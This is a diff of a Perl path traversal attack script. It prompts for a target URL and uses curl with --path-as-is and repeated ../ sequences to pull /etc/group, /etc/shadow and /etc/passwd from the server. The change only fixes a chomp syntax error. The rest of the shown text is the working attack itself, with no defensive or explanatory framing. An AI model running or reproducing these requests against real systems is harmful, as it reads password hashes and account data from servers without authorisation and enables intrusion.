@@ -7,7 +7,7 @@ use diagnostics;
 print "Give URL target for example: http://localhost:8080/\n";
 chomp (my $URL_target = <STDIN>);
 my @attack_m0de = (
-		[chomp (my $m1) = `curl --path-as-is $URL_target../../../../../../etc/group`], 
+		[chomp (my $m1 = `curl --path-as-is $URL_target../../../../../../etc/group`)], 
 		[my $m2 = `curl --path-as-is $URL_target../../../../../../etc/shadow`], 
 		[my $m3 = `curl --path-as-is $URL_target../../../../../../etc/passwd`]
 );
